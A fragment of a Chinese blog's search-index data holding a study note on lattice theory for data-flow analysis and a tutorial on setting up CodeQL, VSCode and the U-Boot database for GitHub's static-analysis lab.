迭代算法转化为不动点定理",slug:"relate-iterative-algorithm-to-fixed-point-theorem-迭代算法转化为不动点定理",normalizedTitle:"relate iterative algorithm to fixed point theorem - 迭代算法转化为不动点定理",charIndex:3788},{level:2,title:"May/Must Analysis, A Lattice View",slug:"may-must-analysis-a-lattice-view",normalizedTitle:"may/must analysis, a lattice view",charIndex:3857},{level:2,title:"Distributivity and MOP",slug:"distributivity-and-mop",normalizedTitle:"distributivity and mop",charIndex:3895},{level:2,title:"Constant Propagation",slug:"constant-propagation",normalizedTitle:"constant propagation",charIndex:3922},{level:2,title:"Work-list Algorithm",slug:"work-list-algorithm",normalizedTitle:"work-list algorithm",charIndex:3947}],headersStr:"Iterative Algorithm, Another View Partial Order - 偏序 Upper and Lower Bounds - 上下界 Lattice, Semilattice, Complete and Product Lattice - 格、半格、全格 Lattice Semilattice Complete Lattice Product Lattice Data Flow Analysis Framework via Lattice Monotonicity and Fixed Point Theorem - 函数单调性和不动点定理 函数单调性 不动点定理 Relate Iterative Algorithm to Fixed Point Theorem - 迭代算法转化为不动点定理 May/Must Analysis, A Lattice View Distributivity and MOP Constant Propagation Work-list Algorithm",content:"# DFA - Foundations\n\n\n# Iterative Algorithm, Another View\n\n一个有K个节点的CFG，迭代算法在每次迭代的过程中，会更新每个节点的OUT信息，表示为OUT[n]。\n\n假设在Data Flow Analysis中的值域是V，那么我们可以定义一个K-tuple：\n\n(OUT[n1],OUT[n2],...OUT[nk])\n\n每个Node的OUT值作为K-tuple的一个元素。因为每个OUT[n]对应的值域都是V，那么K-tuple所对应的一个值域就是V的product，即(V1 x V2 ... x Vk)，定义为Vk。\n\n一次迭代是一个动作，可以表示为一个函数F: Vk -> Vk。\n\n那么，这个算法可以看成每个迭代输出一个K-tuples值，直到最后K-tuples不再发生变化。\n\n根据以上所说的步骤，我们可以将算法图示如下：\n\n\n\n当 X = F(X)时，X是F的一个不动点。迭代算法也就达到了一个不动点(reach a fixed point)。\n\n对于上面的迭代算法会有以下的问题：\n\n * 对于一个普遍的算法，它能停吗？一定可以达到一个不动点吗？一定会输出一个结果吗？\n * 如果能达到不动点，一定只有一个吗？如果不止一个，那么我们得出的这个不动点是最精确的吗？\n * 如果能达到不动点，那么我们最坏情况下能够得到结果？\n\n下面是解决以上问题的理论基础~\n\n\n# Partial Order - 偏序\n\n\n\n定义一个偏序集(P,<=)，P是一个集合，<=是一个偏序关系，当<=满足如下的特性，则构成一个偏序集。\n\n * 自反性：任意x属于P，x <= x\n * 反对称性： 任意的x,y 属于P, x <= y 并且 y <= x，那么 x = y\n * 传递性： 任意x,y,z 属于P，x <= y 并且 y <= z，那么 x <= z\n\n栗子：\n\n 1. 给定(S,<=),S是一个整数集合，偏序关系是<=。\n    \n    * 自反性 1<=1 , 2 <= 2 √\n    * 反对称性： x <= y y <= x x = y √\n    * 传递性： 1<=2<=3 , 1<=3 √\n\n 2. 给定(S,<),S是一个整数集合，偏序关系是<。\n    \n    * 自反性 1 < 1 , 2 < 2 ×\n\n 3. 给定(S,<=),S是一个英文单词的集合，偏序关系是 子串关系。\n    \n    \n    \n    * 自反性：每一个string是自己的substring √\n    * 反对称性：如果一个string是另一个string的substring，同时substring的substring是string，则string和substring相同 √\n    * 传递性：str1是str2的substring，str2是str3的substring，则str1是str3的substring √\n\n偏序指的是集合中的任意两个元素可以不存在比较性，比如上图中的pin sin 并不满足偏序关系，下图的{a},{b}也不满足偏序关系。\n\n 4. 给定(S,<=),S是一个幂集，偏序关系是子集。\n    \n    \n    \n    * 自反性 √\n    * 反对称性 √\n    * 传递性 √\n\n\n# Upper and Lower Bounds - 上下界\n\n\n\n给定一个偏序集(P,<=)，存在一个子集S,对于任意元素u属于P，当任意元素x属于S,满足x<=u，则u是S的一个上界；同样的，对于任意元素l属于P, 当任意元素x属于S，满足l<=x，则l是S的一个下界。\n\n\n\n最小上界，最大下界\n\n\n\n\n\n当集合S只包含两个元素时，可以用如下写法：\n\n\n\n一些性质：\n\n * 不是每一个偏序集都有lub和glb\n * 一个偏序集如果有lub或者glb，那么是唯一的。\n\n\n\n\n# Lattice, Semilattice, Complete and Product Lattice - 格、半格、全格\n\n\n# Lattice\n\n给定一个偏序集(P,<=),任意的P内元素a,b，如果最小上界和最大下界都存在，则我们称偏序集是一格。\n\n偏序集中每两个元素都有最小上界和最大下界我们就称该偏序集是一个格。\n\n栗子：\n\n 1. 给定(S,<=),S是一个整数集合，偏序关系是<=。\n    \n    * 任意两个元素的max和min是最小上界、最大下界。\n\n 2. 给定(S,<=),S是一个英文单词的集合，偏序关系是 子串关系。\n    \n    \n    \n    * pin 和 sin 没有上界\n\n 3. 给定(S,<=),S是一个幂集，偏序关系是子集。\n    \n    \n\n\n# Semilattice\n\n\n\n给定一个偏序集(P,<=)，任意a,b属于P\n\n如果只存在一个最小上界的话，则称为join的半格\n\n如果只存在一个最大下界的话，则称为meet的半格\n\n\n# Complete Lattice\n\n\n\n给定一个格(P,<=)，对于每一个P的子集S，都存在S的最小上界和最大下界，则称(P,<=)为全格。\n\n一个lattice的所有子集都有最小上界和最大下界。\n\n栗子：\n\n 1. 给定(S,<=),S是一个整数集合，偏序关系是<=。\n    * 对于正整数集合，是无穷的没有边界，因此存在一个最大下界，不存在最小上界。因此不是全格。\n 2. 给定(S,<=),S是一个幂集，偏序关系是子集。\n    * 所有的subset都有最小上界和最大下界。\n\n\n\n\n\n每一个全格都有一个最大的元素top，和最小的元素bottom。\n\n只要complete lattice是有穷的，一定是全格。一个全格一定是有穷的吗？ 0-1之间的所有的实数是全格，但是是无穷的。\n\n> 在大部分情况下我们data flow analysis中使用的都是有穷的全格。\n\n\n# Product Lattice\n\n\n\n给定一些格L1=(P1,<=1),L2=(P2,<=2)...Ln=(Pn,<=n),如果每一个lattice都存在一个最小上界和最大下界。则我们可以定义一个product lattice Ln = (P,<=)：\n\n * P = P1 x ... x Pn\n * (x1,...,xn) <= (y1,...,yn) <=> (x1 <= y1)且...且(xn <= yn)\n * (x1,...,xn) , (y1,...,yn)的最小上界 = (x1和y1的最小上界,...,xn和yn的最小上界)\n * (x1,...,xn) , (y1,...,yn)的最大下界 = (x1和y1的最大下界,...,xn和yn的最大下界)\n\n性质：\n\n * 一个product lattice是一个lattice\n * 一个product lattice L中的每一个lattice都是complete，那么L也是complete。\n\n\n# Data Flow Analysis Framework via Lattice\n\n有了上面的理论基础，就可以利用理论基础进行data flow analysis了。\n\n\n\ndata flow analysis的基本框架由以下三个元素构成：\n\n * D：数据流的而方向，forwards还是backwards\n * L：一个格包含值域V和操作符 join or meet\n * F：transfer functions\n\n栗子：\n\n\n\n在lattice上不断地使用meet或者join，借助transfer functions进行迭代。\n\n回到上面提出的问题：\n\n * 对于一个普遍的算法，它能停吗？一定可以达到一个不动点吗？一定会输出一个结果吗？\n   \n   * lattice函数的单调性问题\n\n * 如果能达到不动点，一定只有一个吗？如果不止一个，那么我们得出的这个不动点是最精确的吗？\n   \n   * 可以，X=F(X)\n   \n   \n   \n   * 函数单调性，不动点定理。\n\n * 如果能达到不动点，那么我们最坏情况下能够得到结果？\n\n\n# Monotonicity and Fixed Point Theorem - 函数单调性和不动点定理\n\n\n# 函数单调性\n\n\n\n一个function f: L -> L(L是一个lattice)，如果函数f是单调的，那么任意的x,y属于L，如果x<=y => f(x) <= f(y)\n\n\n# 不动点定理\n\n\n\n给定一个全格(L,<=),如果满足如下结论：\n\n 1. f: L -> L 是单调的\n 2. L是有穷的\n\n那么，我们能求得f的最小不动点，通过迭代f(bottom),f(f(bottom)),...,fk(bottom)直到达到一个不动点，该不动点就是最小不动点。最大不动点是通过迭代f(top),f(f(top)),...,fk(top)直到达到一个不动点，该不动点就是最大不动点。\n\n存在不动点证明：\n\n\n\n最小不动点证明：\n\n\n\n\n\n\n# Relate Iterative Algorithm to Fixed Point Theorem - 迭代算法转化为不动点定理\n\n\n# May/Must Analysis, A Lattice View\n\n\n# Distributivity and MOP\n\n\n# Constant Propagation\n\n\n# Work-list Algorithm",normalizedContent:"# dfa - foundations\n\n\n# iterative algorithm, another view\n\n一个有k个节点的cfg，迭代算法在每次迭代的过程中，会更新每个节点的out信息，表示为out[n]。\n\n假设在data flow analysis中的值域是v，那么我们可以定义一个k-tuple：\n\n(out[n1],out[n2],...out[nk])\n\n每个node的out值作为k-tuple的一个元素。因为每个out[n]对应的值域都是v，那么k-tuple所对应的一个值域就是v的product，即(v1 x v2 ... x vk)，定义为vk。\n\n一次迭代是一个动作，可以表示为一个函数f: vk -> vk。\n\n那么，这个算法可以看成每个迭代输出一个k-tuples值，直到最后k-tuples不再发生变化。\n\n根据以上所说的步骤，我们可以将算法图示如下：\n\n\n\n当 x = f(x)时，x是f的一个不动点。迭代算法也就达到了一个不动点(reach a fixed point)。\n\n对于上面的迭代算法会有以下的问题：\n\n * 对于一个普遍的算法，它能停吗？一定可以达到一个不动点吗？一定会输出一个结果吗？\n * 如果能达到不动点，一定只有一个吗？如果不止一个，那么我们得出的这个不动点是最精确的吗？\n * 如果能达到不动点，那么我们最坏情况下能够得到结果？\n\n下面是解决以上问题的理论基础~\n\n\n# partial order - 偏序\n\n\n\n定义一个偏序集(p,<=)，p是一个集合，<=是一个偏序关系，当<=满足如下的特性，则构成一个偏序集。\n\n * 自反性：任意x属于p，x <= x\n * 反对称性： 任意的x,y 属于p, x <= y 并且 y <= x，那么 x = y\n * 传递性： 任意x,y,z 属于p，x <= y 并且 y <= z，那么 x <= z\n\n栗子：\n\n 1. 给定(s,<=),s是一个整数集合，偏序关系是<=。\n    \n    * 自反性 1<=1 , 2 <= 2 √\n    * 反对称性： x <= y y <= x x = y √\n    * 传递性： 1<=2<=3 , 1<=3 √\n\n 2. 给定(s,<),s是一个整数集合，偏序关系是<。\n    \n    * 自反性 1 < 1 , 2 < 2 ×\n\n 3. 给定(s,<=),s是一个英文单词的集合，偏序关系是 子串关系。\n    \n    \n    \n    * 自反性：每一个string是自己的substring √\n    * 反对称性：如果一个string是另一个string的substring，同时substring的substring是string，则string和substring相同 √\n    * 传递性：str1是str2的substring，str2是str3的substring，则str1是str3的substring √\n\n偏序指的是集合中的任意两个元素可以不存在比较性，比如上图中的pin sin 并不满足偏序关系，下图的{a},{b}也不满足偏序关系。\n\n 4. 给定(s,<=),s是一个幂集，偏序关系是子集。\n    \n    \n    \n    * 自反性 √\n    * 反对称性 √\n    * 传递性 √\n\n\n# upper and lower bounds - 上下界\n\n\n\n给定一个偏序集(p,<=)，存在一个子集s,对于任意元素u属于p，当任意元素x属于s,满足x<=u，则u是s的一个上界；同样的，对于任意元素l属于p, 当任意元素x属于s，满足l<=x，则l是s的一个下界。\n\n\n\n最小上界，最大下界\n\n\n\n\n\n当集合s只包含两个元素时，可以用如下写法：\n\n\n\n一些性质：\n\n * 不是每一个偏序集都有lub和glb\n * 一个偏序集如果有lub或者glb，那么是唯一的。\n\n\n\n\n# lattice, semilattice, complete and product lattice - 格、半格、全格\n\n\n# lattice\n\n给定一个偏序集(p,<=),任意的p内元素a,b，如果最小上界和最大下界都存在，则我们称偏序集是一格。\n\n偏序集中每两个元素都有最小上界和最大下界我们就称该偏序集是一个格。\n\n栗子：\n\n 1. 给定(s,<=),s是一个整数集合，偏序关系是<=。\n    \n    * 任意两个元素的max和min是最小上界、最大下界。\n\n 2. 给定(s,<=),s是一个英文单词的集合，偏序关系是 子串关系。\n    \n    \n    \n    * pin 和 sin 没有上界\n\n 3. 给定(s,<=),s是一个幂集，偏序关系是子集。\n    \n    \n\n\n# semilattice\n\n\n\n给定一个偏序集(p,<=)，任意a,b属于p\n\n如果只存在一个最小上界的话，则称为join的半格\n\n如果只存在一个最大下界的话，则称为meet的半格\n\n\n# complete lattice\n\n\n\n给定一个格(p,<=)，对于每一个p的子集s，都存在s的最小上界和最大下界，则称(p,<=)为全格。\n\n一个lattice的所有子集都有最小上界和最大下界。\n\n栗子：\n\n 1. 给定(s,<=),s是一个整数集合，偏序关系是<=。\n    * 对于正整数集合，是无穷的没有边界，因此存在一个最大下界，不存在最小上界。因此不是全格。\n 2. 给定(s,<=),s是一个幂集，偏序关系是子集。\n    * 所有的subset都有最小上界和最大下界。\n\n\n\n\n\n每一个全格都有一个最大的元素top，和最小的元素bottom。\n\n只要complete lattice是有穷的，一定是全格。一个全格一定是有穷的吗？ 0-1之间的所有的实数是全格，但是是无穷的。\n\n> 在大部分情况下我们data flow analysis中使用的都是有穷的全格。\n\n\n# product lattice\n\n\n\n给定一些格l1=(p1,<=1),l2=(p2,<=2)...ln=(pn,<=n),如果每一个lattice都存在一个最小上界和最大下界。则我们可以定义一个product lattice ln = (p,<=)：\n\n * p = p1 x ... x pn\n * (x1,...,xn) <= (y1,...,yn) <=> (x1 <= y1)且...且(xn <= yn)\n * (x1,...,xn) , (y1,...,yn)的最小上界 = (x1和y1的最小上界,...,xn和yn的最小上界)\n * (x1,...,xn) , (y1,...,yn)的最大下界 = (x1和y1的最大下界,...,xn和yn的最大下界)\n\n性质：\n\n * 一个product lattice是一个lattice\n * 一个product lattice l中的每一个lattice都是complete，那么l也是complete。\n\n\n# data flow analysis framework via lattice\n\n有了上面的理论基础，就可以利用理论基础进行data flow analysis了。\n\n\n\ndata flow analysis的基本框架由以下三个元素构成：\n\n * d：数据流的而方向，forwards还是backwards\n * l：一个格包含值域v和操作符 join or meet\n * f：transfer functions\n\n栗子：\n\n\n\n在lattice上不断地使用meet或者join，借助transfer functions进行迭代。\n\n回到上面提出的问题：\n\n * 对于一个普遍的算法，它能停吗？一定可以达到一个不动点吗？一定会输出一个结果吗？\n   \n   * lattice函数的单调性问题\n\n * 如果能达到不动点，一定只有一个吗？如果不止一个，那么我们得出的这个不动点是最精确的吗？\n   \n   * 可以，x=f(x)\n   \n   \n   \n   * 函数单调性，不动点定理。\n\n * 如果能达到不动点，那么我们最坏情况下能够得到结果？\n\n\n# monotonicity and fixed point theorem - 函数单调性和不动点定理\n\n\n# 函数单调性\n\n\n\n一个function f: l -> l(l是一个lattice)，如果函数f是单调的，那么任意的x,y属于l，如果x<=y => f(x) <= f(y)\n\n\n# 不动点定理\n\n\n\n给定一个全格(l,<=),如果满足如下结论：\n\n 1. f: l -> l 是单调的\n 2. l是有穷的\n\n那么，我们能求得f的最小不动点，通过迭代f(bottom),f(f(bottom)),...,fk(bottom)直到达到一个不动点，该不动点就是最小不动点。最大不动点是通过迭代f(top),f(f(top)),...,fk(top)直到达到一个不动点，该不动点就是最大不动点。\n\n存在不动点证明：\n\n\n\n最小不动点证明：\n\n\n\n\n\n\n# relate iterative algorithm to fixed point theorem - 迭代算法转化为不动点定理\n\n\n# may/must analysis, a lattice view\n\n\n# distributivity and mop\n\n\n# constant propagation\n\n\n# work-list algorithm",charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"CodeQL - UBoot练习项目（上）",frontmatter:{title:"CodeQL - UBoot练习项目（上）",date:"2022-04-03T00:00:00.000Z",permalink:"/sec/sa/codeql/uboot1",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["静态分析","CodeQL"],tags:["CodeQL"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/200.%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/2001.CodeQL/00.%20CodeQL%20-%20UBoot%E7%BB%83%E4%B9%A0%E9%A1%B9%E7%9B%AE%EF%BC%88%E4%B8%8A%EF%BC%89.html",relativePath:"02.安全/200.静态分析/2001.CodeQL/00. CodeQL - UBoot练习项目（上）.md",key:"v-34d8b340",path:"/sec/sa/codeql/uboot1/",headers:[{level:2,title:"0. 创建项目",slug:"_0-创建项目",normalizedTitle:"0. 创建项目",charIndex:306},{level:3,title:"1. 欢迎来到课程",slug:"_1-欢迎来到课程",normalizedTitle:"1. 欢迎来到课程",charIndex:540},{level:2,title:"2. 设置IDE环境",slug:"_2-设置ide环境",normalizedTitle:"2. 设置ide环境",charIndex:771},{level:3,title:"1. 启用Github Actions",slug:"_1-启用github-actions",normalizedTitle:"1. 启用github actions",charIndex:848},{level:3,title:"2. 安装VSCode",slug:"_2-安装vscode",normalizedTitle:"2. 安装vscode",charIndex:937},{level:3,title:"3. 下载CodeQL starter",slug:"_3-下载codeql-starter",normalizedTitle:"3. 下载codeql starter",charIndex:1049},{level:3,title:"4. 下载U-Boot CodeQL数据库",slug:"_4-下载u-boot-codeql数据库",normalizedTitle:"4. 下载u-boot codeql数据库",charIndex:1389},{level:3,title:"5. 导入数据库",slug:"_5-导入数据库",normalizedTitle:"5. 导入数据库",charIndex:1583}],excerpt:'<h1 id="codeql-uboot练习项目-上"><a class="header-anchor" href="#codeql-uboot练习项目-上">#</a> CodeQL - UBoot练习项目（上）</h1>\n<p>CodeQL是由Github安全实验室推出的一款用于自动化代码安全检查的引擎，通过该应用帮助安全研究者发现和挖掘程序中潜在的威胁和漏洞，方便对程序所面临的威胁进行分析。CodeQL将需要分析的代码提取保存到数据库中，然后使用类SQL的查询语句查询数据库，发现程序中的Bug和安全漏洞。</p>\n',headersStr:"0. 创建项目 1. 欢迎来到课程 2. 设置IDE环境 1. 启用Github Actions 2. 安装VSCode 3. 下载CodeQL starter 4. 下载U-Boot CodeQL数据库 5. 导入数据库",content:"# CodeQL - UBoot练习项目（上）\n\nCodeQL是由Github安全实验室推出的一款用于自动化代码安全检查的引擎，通过该应用帮助安全研究者发现和挖掘程序中潜在的威胁和漏洞，方便对程序所面临的威胁进行分析。CodeQL将需要分析的代码提取保存到数据库中，然后使用类SQL的查询语句查询数据库，发现程序中的Bug和安全漏洞。\n\nGithub实验室中提供了一个练习的项目，方便从入门环境搭建开始一步一步熟悉CodeQL语法，项目使用的是C/C++的语言，审计的项目是U-Boot。\n\n这一篇文章包括Uboot项目的开始和CodeQL的环境搭建，对应了CodeQL-UBoot项目的第1、2两课。\n\n\n# 0. 创建项目\n\n项目地址：https://lab.github.com/githubtraining/codeql-u-boot-challenge-(cc++)\n\n\n\n第一次使用Github的lab功能需要先进行授权，授权完成之后，可再次点击Start Free course。\n\n\n\n点击绿色按钮，进入到项目中。该项目在你的GitHub中创建了一个公开的仓库，并配合Github Actions，当代码提交后，自动触发检测，判断你写的代码是否正确。\n\n\n\n\n# 1. 欢迎来到课程\n\n第一课是对整个练习项目的一个概括和导入。该课程的目标是在 U-Boot 引导加载程序中找到一组 9 个远程代码执行漏洞。这些漏洞最初是由 GitHub 安全实验室研究人员发现的，并已得到修复。并且给出了相应的帮助文档，这些帮助文档在这一篇最后的参考资料中也有给出。\n\n在看完相关的简介之后，点击评论区下面的Close issue即可关闭当前问题。关闭问题之后，github- learning-lab的评论中会有下一步的链接。\n\n\n\n\n# 2. 设置IDE环境\n\n这一节教我们如何设置一个CodeQL的环境。使用CodeQL的VSCode拓展完成代码补全、上下文帮助等IDE相关功能。\n\n\n# 1. 启用Github Actions\n\n这一步和CodeQL环境搭建无关，只是为了后面更好的继续整个课程。开启的方法很简单，只需要点击链接，然后点击启用按钮即可。\n\n\n\n\n# 2. 安装VSCode\n\nVSCode是微软开发的一款十分好用的文本编辑工具。下载地址如下：\n\nhttps://code.visualstudio.com/Download\n\n相关的安装、配置请参考网上的其他资料。\n\n\n# 3. 下载CodeQL starter\n\n根据给出的链接，跳转到vscode-codeql-starter下载页面，按照页面的帮助完成设置。\n\n# 3.1 安装VSCode\n\n# 3.2 安装VSCode的CodeQL插件\n\n插件安装地址：https://marketplace.visualstudio.com/items?itemName=github.vscode-codeql\n\n也可以在VSCode的插件库中搜索CodeQL插件\n\n\n\n# 3.3 将当前的仓库克隆到本地\n\n git clone --recursive git@github.com:github/vscode-codeql-starter.git\n\n\n1\n\n\nVSCode打开克隆的项目。\n\n\n\n\n# 4. 下载U-Boot CodeQL数据库\n\n下载地址：https://downloads.lgtm.com/snapshots/cpp/uboot/u-boot_u-boot_cpp-srcVersion_d0d07ba86afc8074d79e436b1ba4478fa0f0c1b5-dist_odasa-2019-07-25-linux64.zip\n\n下载完成后，解压。\n\n\n# 5. 导入数据库\n\n使用CodeQL的VSCode插件导入数据库，这个数据库是后续的课程中查询的一个基础。\n\n注意：在点击了CodeQL插件之后，该插件会自动帮我们下载CodeQL CLI，下载速度较慢，这里我们使用自己下载和配置的CodeQL CLI。\n\n\n\n我们先关闭 VSCode，然后去下载和配置CodeQL CLI。\n\n 1. 在如下地址中，下载对应版本的CodeQL CLI：https://github.com/github/codeql-cli-binaries/releases\n\n 2. 创建一个目录用于存放下载的CodeQL，我这里命名为codeql_home，并将下载的文件解压到该文件夹下。\n\n 3. 之后需要去获取CodeQL仓库 的本地副本。因为这个仓库和我们下载的压缩文件解压后的文件名一样，所以这一步我们在clone的时候需要重命名一下。\n\ngit clone git@github.com:github/codeql.git codeql-repo\n\n\n1\n\n\n 4. Go语言分析使用的库文件和查询文件在另一个独立的仓库CodeQL for Go repository中，也把它克隆到codeql-home中。\n    \n    两个仓库应该有兄弟的关系。比如：如果CodeQL仓库的路径是$HOME/codeql-home/codeql-repo，那么CodeQL for Go的根目录就应该是$HOME/codeql-home/codeql-go。\n\n 5. 测试CodeQL CLI能否正常使用\n    \n    CodeQL CLI有一些子命令可以执行。执行这些子命令可以帮助判断你有没有正确的配置和创建数据库：\n    \n    * codeql resolve languages命令会列举出支持哪些语言的支持创建数据库。\n    * codeql resolve qlpacks命令会列举出CLI可以找到的QL packs。这条命令会列举出CodeQL仓库（codeql-cpp, codeql-csharp, codeql-go, codeql-java, codeql-javascript, 和 codeql-python）中QL packs的名字。CodeQL仓库中也包含了upgrade包和legacy包。当您想要升级数据库，以便能够使用新版本的CodeQL工具链(而不是用于创建数据库的CodeQL工具链)分析数据库时，CLI会使用升级包。legacy包确保使用旧产品创建的自定义查询和库与您的CodeQL版本兼容。\n\n\n\n 6. 将CodeQL CLI添加到环境变量中。\n    \n    vim ~/.zshrc\n    # 添加如下几行\n    # CODEQL_HOME\n    export CODEQL_HOME=~/Workspace/ProgramAnalysis/codeql_home\n    export PATH=$PATH:$CODEQL_HOME/codeql\n    \n    source ~/.zshrc\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n    \n    Windows 添加环境变量的方式请参考其他文章。\n\n 7. 测试环境变量是否有效\n    \n    \n\n 8. 当我们配置了环境变量后，VSCode会自动识别并使用我们自己的CodeQL CLI\n\n之后我们继续将我们下载的数据库导入。\n\n点击CodeQL插件，选择From a folder选择从文件夹中导入。\n\n\n\n之后，选择我们下载的数据库解压后的文件夹。导入之后在DataBases中就有了UBoot的数据库了。\n\n\n\n# 6. 克隆练习项目到本地并加入starter\n\n克隆你自己github仓库中的项目到本地。\n\ngit clone git@github.com:p0josec/codeql-uboot.git\n\n\n1\n\n\n在VSCode中将文件夹添加到starter项目中。\n\n\n\n添加完成后，在starter项目中会有我们添加的项目，以后就可以在VSCode中完成相关的代码编写了。\n\n\n\n到这里，这一课就结束了，我们可以和上一课一样，点击close issue，关闭当前课程，并根据机器人的提示，进入下一课。\n\n----------------------------------------\n\n如果完全介绍完Uboot练习项目的全部10课的内容，篇幅会过长，剩下的内容以后再更新。这一篇就写到这里啦。\n\n下面是这一篇的参考资料：\n\nCodeQL Github\n\nCodeQL-Cli Github\n\nCodeQL-VSCode Github\n\nLGTM.COM\n\nCodeQL 官网",normalizedContent:"# codeql - uboot练习项目（上）\n\ncodeql是由github安全实验室推出的一款用于自动化代码安全检查的引擎，通过该应用帮助安全研究者发现和挖掘程序中潜在的威胁和漏洞，方便对程序所面临的威胁进行分析。codeql将需要分析的代码提取保存到数据库中，然后使用类sql的查询语句查询数据库，发现程序中的bug和安全漏洞。\n\ngithub实验室中提供了一个练习的项目，方便从入门环境搭建开始一步一步熟悉codeql语法，项目使用的是c/c++的语言，审计的项目是u-boot。\n\n这一篇文章包括uboot项目的开始和codeql的环境搭建，对应了codeql-uboot项目的第1、2两课。\n\n\n# 0. 创建项目\n\n项目地址：https://lab.github.com/githubtraining/codeql-u-boot-challenge-(cc++)\n\n\n\n第一次使用github的lab功能需要先进行授权，授权完成之后，可再次点击start free course。\n\n\n\n点击绿色按钮，进入到项目中。该项目在你的github中创建了一个公开的仓库，并配合github actions，当代码提交后，自动触发检测，判断你写的代码是否正确。\n\n\n\n\n# 1. 欢迎来到课程\n\n第一课是对整个练习项目的一个概括和导入。该课程的目标是在 u-boot 引导加载程序中找到一组 9 个远程代码执行漏洞。这些漏洞最初是由 github 安全实验室研究人员发现的，并已得到修复。并且给出了相应的帮助文档，这些帮助文档在这一篇最后的参考资料中也有给出。\n\n在看完相关的简介之后，点击评论区下面的close issue即可关闭当前问题。关闭问题之后，github- learning-lab的评论中会有下一步的链接。\n\n\n\n\n# 2. 设置ide环境\n\n这一节教我们如何设置一个codeql的环境。使用codeql的vscode拓展完成代码补全、上下文帮助等ide相关功能。\n\n\n# 1. 启用github actions\n\n这一步和codeql环境搭建无关，只是为了后面更好的继续整个课程。开启的方法很简单，只需要点击链接，然后点击启用按钮即可。\n\n\n\n\n# 2. 安装vscode\n\nvscode是微软开发的一款十分好用的文本编辑工具。下载地址如下：\n\nhttps://code.visualstudio.com/download\n\n相关的安装、配置请参考网上的其他资料。\n\n\n# 3. 下载codeql starter\n\n根据给出的链接，跳转到vscode-codeql-starter下载页面，按照页面的帮助完成设置。\n\n# 3.1 安装vscode\n\n# 3.2 安装vscode的codeql插件\n\n插件安装地址：https://marketplace.visualstudio.com/items?itemname=github.vscode-codeql\n\n也可以在vscode的插件库中搜索codeql插件\n\n\n\n# 3.3 将当前的仓库克隆到本地\n\n git clone --recursive git@github.com:github/vscode-codeql-starter.git\n\n\n1\n\n\nvscode打开克隆的项目。\n\n\n\n\n# 4. 下载u-boot codeql数据库\n\n下载地址：https://downloads.lgtm.com/snapshots/cpp/uboot/u-boot_u-boot_cpp-srcversion_d0d07ba86afc8074d79e436b1ba4478fa0f0c1b5-dist_odasa-2019-07-25-linux64.zip\n\n下载完成后，解压。\n\n\n# 5. 导入数据库\n\n使用codeql的vscode插件导入数据库，这个数据库是后续的课程中查询的一个基础。\n\n注意：在点击了codeql插件之后，该插件会自动帮我们下载codeql cli，下载速度较慢，这里我们使用自己下载和配置的codeql cli。\n\n\n\n我们先关闭 vscode，然后去下载和配置codeql cli。\n\n 1. 在如下地址中，下载对应版本的codeql cli：https://github.com/github/codeql-cli-binaries/releases\n\n 2. 创建一个目录用于存放下载的codeql，我这里命名为codeql_home，并将下载的文件解压到该文件夹下。\n\n 3. 之后需要去获取codeql仓库 的本地副本。因为这个仓库和我们下载的压缩文件解压后的文件名一样，所以这一步我们在clone的时候需要重命名一下。\n\ngit clone git@github.com:github/codeql.git codeql-repo\n\n\n1\n\n\n 4. go语言分析使用的库文件和查询文件在另一个独立的仓库codeql for go repository中，也把它克隆到codeql-home中。\n    \n    两个仓库应该有兄弟的关系。比如：如果codeql仓库的路径是$home/codeql-home/codeql-repo，那么codeql for go的根目录就应该是$home/codeql-home/codeql-go。\n\n 5. 测试codeql cli能否正常使用\n    \n    codeql cli有一些子命令可以执行。执行这些子命令可以帮助判断你有没有正确的配置和创建数据库：\n    \n    * codeql resolve languages命令会列举出支持哪些语言的支持创建数据库。\n    * codeql resolve qlpacks命令会列举出cli可以找到的ql packs。这条命令会列举出codeql仓库（codeql-cpp, codeql-csharp, codeql-go, codeql-java, codeql-javascript, 和 codeql-python）中ql packs的名字。codeql仓库中也包含了upgrade包和legacy包。当您想要升级数据库，以便能够使用新版本的codeql工具链(而不是用于创建数据库的codeql工具链)分析数据库时，cli会使用升级包。legacy包确保使用旧产品创建的自定义查询和库与您的codeql版本兼容。\n\n\n\n 6. 将codeql cli添加到环境变量中。\n    \n    vim ~/.zshrc\n    # 添加如下几行\n    # codeql_home\n    export codeql_home=~/workspace/programanalysis/codeql_home\n    export path=$path:$codeql_home/codeql\n    \n    source ~/.zshrc\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n    \n    windows 添加环境变量的方式请参考其他文章。\n\n 7. 测试环境变量是否有效\n    \n    \n\n 8. 当我们配置了环境变量后，vscode会自动识别并使用我们自己的codeql cli\n\n之后我们继续将我们下载的数据库导入。\n\n点击codeql插件，选择from a folder选择从文件夹中导入。\n\n\n\n之后，选择我们下载的数据库解压后的文件夹。导入之后在databases中就有了uboot的数据库了。\n\n\n\n# 6. 克隆练习项目到本地并加入starter\n\n克隆你自己github仓库中的项目到本地。\n\ngit clone git@github.com:p0josec/codeql-uboot.git\n\n\n1\n\n\n在vscode中将文件夹添加到starter项目中。\n\n\n\n添加完成后，在starter项目中会有我们添加的项目，以后就可以在vscode中完成相关的代码编写了。\n\n\n\n到这里，这一课就结束了，我们可以和上一课一样，点击close issue，关闭当前课程，并根据机器人的提示，进入下一课。\n\n----------------------------------------\n\n如果完全介绍完uboot练习项目的全部10课的内容，篇幅会过长，剩下的内容以后再更新。这一篇就写到这里啦。\n\n下面是这一篇的参考资料：\n\ncodeql github\n\ncodeql-cli github\n\ncodeql-vscode github\n\nlgtm.com\n\ncodeql 官网",charsets:{cjk:!0},lastUpdated:"2022/04/04, 16:22:20",lastUpdatedTimestamp:164908934e4},{title:"CodeQL - UBoot练习项目（下）",frontmatter:{title:"CodeQL - 